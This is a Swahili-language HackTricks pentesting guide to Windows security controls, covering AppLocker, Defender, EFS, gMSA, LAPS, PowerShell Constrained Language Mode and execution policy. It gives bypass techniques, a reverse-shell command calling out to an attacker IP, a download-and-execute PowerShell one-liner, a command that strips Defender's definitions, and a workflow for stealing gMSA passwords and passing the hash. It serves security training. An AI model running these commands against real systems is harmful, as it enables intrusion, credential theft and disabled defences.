# Vidhibiti vya Usalama vya Windows

{{#include ../../banners/hacktricks-training.md}}

## Sera ya AppLocker

Orodha ya whitelist ya application ni orodha ya application au executable zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na software ambayo haijaidhinishwa na isiyolingana na mahitaji mahususi ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la application whitelisting** la Microsoft na huwapa wasimamizi wa mfumo udhibiti wa **application na faili ambazo watumiaji wanaweza kuendesha**. Hutoa **udhibiti wa kina** wa executable, script, faili za Windows installer, DLL, packaged app, na packed app installer.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** pamoja na ruhusa ya kuandika kwenye directories fulani, **lakini yote haya yanaweza kuepukwa**.

### Kagua

Kagua ni faili/extensions zipi ziko kwenye blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Njia hii ya registry ina usanidi na policies zinazotumiwa na AppLocker, hivyo kutoa njia ya kukagua seti ya sasa ya rules zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** muhimu za kufanya bypass ya AppLocker Policy: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **writable folders** unazoweza kutumia kufanya **bypass** hii.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Binaries za [**"LOLBAS's"**](https://lolbas-project.github.io/) ambazo kwa kawaida **huaminika** zinaweza pia kutumika kukwepa AppLocker.
- **Rules zilizoandikwa vibaya pia zinaweza kukwepwa**
- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folder yenye jina `allowed`** popote na itaruhusiwa.
- Organizations pia mara nyingi hulenga **kuzuia executable ya `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu [**maeneo mengine ya PowerShell executable**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **DLL enforcement huwashwa mara chache sana** kutokana na mzigo wa ziada unaoweza kuwekwa kwenye mfumo, pamoja na kiasi cha testing kinachohitajika kuhakikisha hakuna kitu kitakachoharibika. Kwa hiyo, kutumia **DLLs kama backdoors kutasaidia kukwepa AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) **kutekeleza** code ya **Powershell** katika process yoyote na kukwepa AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Uhifadhi wa Credentials

### Security Accounts Manager (SAM)

Credentials za ndani zipo kwenye faili hili, na passwords zime-hash-iwa.

### Local Security Authority (LSA) - LSASS

**Credentials** (zilizo-hash-iwa) **huhifadhiwa** kwenye **memory** ya subsystem hii kwa sababu za Single Sign-On.\
**LSA** husimamia **security policy** ya ndani (password policy, permissions za users...), **authentication**, **access tokens**...\
LSA ndiyo **itakayoangalia** credentials zilizotolewa ndani ya faili la **SAM** (kwa local login) na **kuwasiliana** na **domain controller** ili kufanya authentication ya domain user.

**Credentials** **huhifadhiwa** ndani ya **process ya LSASS**: Kerberos tickets, NT na LM hashes, passwords ambazo zinaweza kufutwa kwa urahisi.

### LSA secrets

LSA inaweza kuhifadhi baadhi ya credentials kwenye disk:

- Password ya computer account ya Active Directory (domain controller isiyoweza kufikiwa).
- Passwords za accounts za Windows services
- Passwords za scheduled tasks
- Mengine (password ya IIS applications...)

### NTDS.dit

Hii ni database ya Active Directory. Inapatikana tu kwenye Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana kwenye Windows 10 na Windows 11, pamoja na matoleo ya Windows Server. **Huzuia** pentesting tools za kawaida kama **`WinPEAS`**. Hata hivyo, kuna njia za **kukwepa protections hizi**.

### Ukaguzi

Ili kuangalia **status** ya **Defender**, unaweza kutekeleza PS cmdlet **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** ili kujua ikiwa imewashwa):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili kui-enumerate, unaweza pia kuendesha:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS hulinda faili kupitia encryption, kwa kutumia **symmetric key** inayojulikana kama **File Encryption Key (FEK)**. Key hii hu-encryptiwa kwa **public key** ya mtumiaji na kuhifadhiwa ndani ya **alternative data stream** ya faili iliyosimbwa, yaani $EFS. Decryption inapohitajika, **private key** inayolingana ya digital certificate ya mtumiaji hutumika ku-decrypt FEK kutoka kwenye stream ya $EFS. Maelezo zaidi yanapatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios bila kuanzishwa na mtumiaji** ni pamoja na:

- Faili au folda zinapohamishwa kwenye file system isiyo ya EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), hu-decryptiwa kiotomatiki.
- Faili zilizo-encryptiwa zinapotumwa kupitia mtandao kwa kutumia SMB/CIFS protocol, hu-decryptiwa kabla ya kutumwa.

Njia hii ya encryption huruhusu **transparent access** ya faili zilizo-encryptiwa kwa mmiliki. Hata hivyo, kubadilisha tu password ya mmiliki na kuingia hakutaruhusu decryption.

**Mambo muhimu ya kukumbuka**:

- EFS hutumia symmetric FEK, iliyo-encryptiwa kwa public key ya mtumiaji.
- Decryption hutumia private key ya mtumiaji kufikia FEK.
- Decryption ya kiotomatiki hutokea chini ya hali maalum, kama kunakili kwenda FAT32 au kutuma kupitia mtandao.
- Faili zilizo-encryptiwa zinaweza kufikiwa na mmiliki bila hatua za ziada.

### Kagua taarifa za EFS

Kagua ikiwa **user** amewahi **kutumia** **service** hii kwa kuangalia kama path hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kagua **nani** ana **access** kwenye faili kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folder ili **ku-encrypt** na **ku-decrypt** faili zote

### Ku-decrypt faili za EFS

#### Kuwa Authority System

Njia hii inahitaji **victim user** awe **aki-run** **process** ndani ya host. Ikiwa hivyo ndivyo, kwa kutumia `meterpreter` sessions unaweza ku-impersonate token ya process ya mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu kufanya `migrate` kwenda kwenye process ya mtumiaji.

#### Kujua password ya mtumiaji

Mimikatz inaeleza jinsi ya ku-import certificate/private key material ya mtumiaji na ku-decrypt faili zilizolindwa na EFS wakati password inajulikana.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa service accounts katika miundombinu ya IT. Tofauti na service accounts za kawaida ambazo mara nyingi huwa na setting ya "**Password never expire**", gMSAs hutoa suluhisho salama na rahisi zaidi la kusimamia:

- **Automatic Password Management**: gMSAs hutumia password changamano yenye herufi 240 ambayo hubadilika kiotomatiki kulingana na policy ya domain au computer. Mchakato huu unasimamiwa na Microsoft's Key Distribution Service (KDC), hivyo kuondoa hitaji la kusasisha password kwa mikono.
- **Enhanced Security**: Accounts hizi haziathiriwi na lockouts na haziwezi kutumika kwa interactive logins, jambo linaloongeza usalama wao.
- **Multiple Host Support**: gMSAs zinaweza kushirikiwa kwenye hosts nyingi, hivyo kuzifanya zifae kwa services zinazoendeshwa kwenye servers nyingi.
- **Scheduled Task Capability**: Tofauti na managed service accounts, gMSAs zinaunga mkono uendeshaji wa scheduled tasks.
- **Simplified SPN Management**: Mfumo husasisha kiotomatiki Service Principal Name (SPN) kunapokuwa na mabadiliko kwenye taarifa za sAMaccount au DNS name ya computer, hivyo kurahisisha usimamizi wa SPN.

Passwords za gMSAs huhifadhiwa kwenye LDAP property _**msDS-ManagedPassword**_ na hu-resetiwa kiotomatiki kila baada ya siku 30 na Domain Controllers (DCs). Password hii, ambayo ni encrypted data blob inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), inaweza tu kuretrieviwa na administrators walioidhinishwa na servers ambazo gMSAs zimewekwa, hivyo kuhakikisha mazingira salama. Ili kufikia taarifa hii, secured connection kama LDAPS inahitajika, au connection lazima iwe authenticated kwa 'Sealing & Secure'.

![Ku-relay NTLM authentication ili kuretrieve gMSA password](../../images/asd1.png)<sup>[[1]](#references)</sup>

Unaweza kusoma password hii kwa [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pata maelezo zaidi katika utafiti wa awali uliohifadhiwa**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Utafiti huo huo unaeleza jinsi **NTLM relay attack** inaweza kupata **gMSA password** wakati principal anayerelewa ameidhinishwa kusoma `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Kutumia vibaya ACL chaining kusoma gMSA managed password (GenericAll -> ReadGMSAPassword)

Katika mazingira mengi, watumiaji wenye privileges ndogo wanaweza kufikia gMSA secrets bila ku-compromise DC kwa kutumia vibaya object ACLs zilizosanidiwa vibaya:<sup>[[3]](#references)</sup>

- Group unayoweza kuidhibiti (kwa mfano, kupitia GenericAll/GenericWrite) imepewa `ReadGMSAPassword` juu ya gMSA.
- Kwa kujiongeza kwenye group hiyo, unarithi ruhusa ya kusoma gMSA’s `msDS-ManagedPassword` blob kupitia LDAP na kupata NTLM credentials zinazoweza kutumika.

Typical workflow:

1) Tambua path kwa kutumia BloodHound na uweke foothold principals zako kama Owned. Tafuta edges kama:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Jiongeze kwenye intermediate group unayoidhibiti (mfano kwa kutumia bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Soma nenosiri linalosimamiwa la gMSA kupitia LDAP na uderive hash ya NTLM. NetExec hujiendesha yenyewe katika kutoa `msDS-ManagedPassword` na kuibadilisha kuwa NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Thibitisha utambulisho kama gMSA kwa kutumia NTLM hash (hakuna plaintext inayohitajika). Ikiwa akaunti iko kwenye Remote Management Users, WinRM itafanya kazi moja kwa moja:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- Usomaji wa LDAP wa `msDS-ManagedPassword` unahitaji sealing (kwa mfano, LDAPS/sign+seal). Tools hushughulikia hili kiotomatiki.
- gMSAs mara nyingi hupewa local rights kama WinRM; thibitisha group membership (kwa mfano, Remote Management Users) ili kupanga lateral movement.
- Ikiwa unahitaji blob pekee ili kukokotoa NTLM mwenyewe, tazama muundo wa MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

**Local Administrator Password Solution (LAPS)**, inayopatikana kwa kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), huwezesha usimamizi wa nywila za local Administrator. Nywila hizi, ambazo ni **randomized**, za kipekee, na **hubadilishwa mara kwa mara**, huhifadhiwa katikati katika Active Directory. Ufikiaji wa nywila hizi umewekewa vikwazo kupitia ACLs kwa watumiaji walioidhinishwa. Kwa permissions za kutosha, uwezo wa kusoma nywila za local admin hutolewa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **hufunga vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia COM objects, kuruhusu tu approved .NET types, XAML-based workflows, PowerShell classes, na mengineyo.

### **Kagua**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Kwenye matoleo ya sasa ya Windows, bypass hiyo haifanyi kazi tena, lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikompile huenda ukahitaji** **ili** _**Uongeze Rejeleo**_ -> _Vinjari_ ->_Vinjari_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **ubadilishe mradi uwe .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** code katika process yoyote na kukwepa constrained mode. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

Kwa chaguo-msingi imewekwa kuwa **restricted.** Njia kuu za kukwepa sera hii:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mengi yanaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

Ni API inayoweza kutumika kuthibitisha watumiaji.

SSPI huchagua itifaki inayofaa ya authentication kwa mashine mbili zinazowasiliana, huku ikipendelea Kerberos inapopatikana. Itifaki hizi hutekelezwa na Security Support Providers (SSPs), ambazo husakinishwa kama DLLs kwenye Windows; pande zote mbili lazima ziunge mkono provider iliyojadiliwa.

### SSP kuu

- **Kerberos**: Inayopendelewa
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Kwa sababu za compatibility
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers na LDAP, password ikiwa katika mfumo wa MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Hutumika kujadiliana itifaki ya kutumia (Kerberos au NTLM, huku Kerberos ikiwa ya msingi)
- %windir%\Windows\System32\lsasrv.dll

#### Majadiliano yanaweza kutoa mbinu kadhaa au moja pekee.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **consent prompt kwa shughuli zilizoinuliwa**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA kupitia rights chaining hadi WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Kupita AppLocker na PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – Njia 15 za Kupita PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ kusimbua faili za EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
